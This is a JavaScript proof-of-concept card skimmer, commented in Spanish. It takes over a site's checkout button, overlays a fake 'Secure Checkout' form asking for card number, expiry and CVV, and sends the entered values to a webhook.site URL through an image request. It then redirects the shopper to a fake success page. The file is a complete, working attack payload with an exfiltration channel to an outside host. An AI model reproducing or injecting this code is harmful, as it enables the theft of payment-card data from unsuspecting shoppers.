(function() {
    // 1. Configuración y Logs de depuración
    var webhookUrl = "https://webhook.site/cfcaa601-1896-4266-9c57-33605ad12c9e";
    var d = document;
    console.log("PoC Dashdoor: Script cargado e iniciando observación...");

    function initInfection(targetButton) {
        if (targetButton.getAttribute("d")) return;
        
        console.log("PoC: Botón encontrado. Clonando para interceptar...");
        
        // Clonamos para eliminar otros eventos previos
        var infectedButton = targetButton.cloneNode(true);
        infectedButton.setAttribute("d", "1");
        
        targetButton.parentNode.replaceChild(infectedButton, targetButton);
        
        infectedButton.addEventListener("click", function(e) {
            e.preventDefault();
            e.stopImmediatePropagation();
            console.log("PoC: Click interceptado. Mostrando interfaz falsa...");
            showFakeForm();
        });
    }

    // 2. Observer mejorado
    var observer = new MutationObserver(function(mutations) {
        var btn = d.querySelector('a[data-testid="CheckoutButton"]');
        if (btn && !btn.getAttribute("d")) {
            initInfection(btn);
        }
    });

    // Empezamos a observar el documento completo para evitar problemas de carga
    if (d.documentElement) {
        observer.observe(d.documentElement, { childList: true, subtree: true });
    }

    // 3. Interfaz de captura
    function showFakeForm() {
        var html = `
        <div id="fake-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999999;font-family:sans-serif;text-align:center;padding:40px;">
            <h2 style="margin-bottom:20px">Secure Checkout</h2>
            <div style="border:1px solid #ccc;padding:20px;text-align:left;max-width:400px;margin:0 auto;">
                <input id="c" placeholder="Card Number" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc">
                <div style="display:flex;gap:10px">
                    <input id="e" placeholder="MM/YY" style="width:50%;padding:10px;border:1px solid #ccc">
                    <input id="v" placeholder="CVV" style="width:50%;padding:10px;border:1px solid #ccc">
                </div>
            </div>
            <button id="b" onclick="submitData()" style="width:100%;max-width:400px;margin-top:20px;padding:15px;background:#000;color:#fff;border:none;cursor:pointer">Pay Now</button>
        </div>`;
        d.body.insertAdjacentHTML("beforeend", html);
    }

    // 4. Función de exfiltración global
    window.submitData = function() {
        var card = d.getElementById("c").value;
        var exp = d.getElementById("e").value;
        var cvv = d.getElementById("v").value;
        
        console.log("PoC: Exfiltrando datos...");
        d.getElementById("b").innerText = "Processing...";
        
        // Exfiltración vía imagen
        new Image().src = webhookUrl + "?card=" + card + "&exp=" + exp + "&cvv=" + cvv;
        
        setTimeout(function() {
            window.location.href = "https://sitio-real.com/checkout-exitoso";
        }, 1500);
    };
})();
